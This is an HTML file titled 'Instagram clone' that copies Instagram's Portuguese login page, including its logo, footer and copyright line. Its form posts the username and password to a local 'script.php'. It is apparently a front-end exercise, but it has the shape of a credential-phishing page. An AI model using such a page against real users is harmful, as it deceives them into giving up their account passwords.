


<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram clone</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form method="post" action='script.php'>
                    <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>
                    <input name="email" placeholder="Telefone, nome de usuário ou e-mail" />

                    <label for="password" class="sr-only">Senha</label>
                    <input name="password" type="password" placeholder="Senha" />

                    <button type="submit">Entrar</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OU</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Entrar com o facebook</a>
                    </div>
                    <a href="#">Esqueceua senha?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Não tem uma conta?</p>
                <a href="#">Cadastre-se</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Obtenha o aplicativo.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">SOBRE</a></li>
            <li><a href="#">AJUDA</a></li>
            <li><a href="#">IMPRENSA</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CARREIRAS</a></li>
            <li><a href="#">PRIVACIDADE</a></li>
            <li><a href="#">TERMOS</a></li>
            <li><a href="#">LOCALIZAÇÃO</a></li>
            <li><a href="#">CONTAS MAIS RELEVANTES</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">IDIOMA</a></li>
        </ul>
        <p class="copyright">© 2024 Instagram do Facebook</p>
    </footer>
</body>
</html>